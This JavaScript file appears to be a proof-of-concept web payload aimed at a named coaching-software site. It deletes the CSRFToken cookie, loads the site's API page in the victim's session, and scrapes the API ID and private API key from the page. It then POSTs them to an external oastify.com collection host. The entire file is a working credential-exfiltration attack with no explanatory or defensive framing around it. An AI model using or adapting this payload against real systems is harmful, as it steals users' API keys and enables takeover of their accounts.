// Function to delete the CSRFToken cookie
function deleteCookie(name) {
  document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
}

// Delete the CSRFToken cookie
deleteCookie("CSRFToken");

// Function to send extracted data to the external server
function sendData(apiId, apiKey) {
  fetch("https://lj8xnmcmaivpwy0jmm1mnhyqnht8h25r.oastify.com", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ apiId: apiId, apiKey: apiKey })
  });
}

// Send the GET request and process the response
fetch("https://www.coachaccountable.com/AJAX?page=API")
  .then(response => response.text())
  .then(html => {
    // Parse the response to extract API ID and Private API Key
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");
    const apiId = doc.querySelector(".embedCode").textContent.trim();
    const apiKey = doc.getElementById("APIKeyDiv").textContent.trim();

    // Send the extracted data
    sendData(apiId, apiKey);
  })
  .catch(error => console.error("Error:", error));
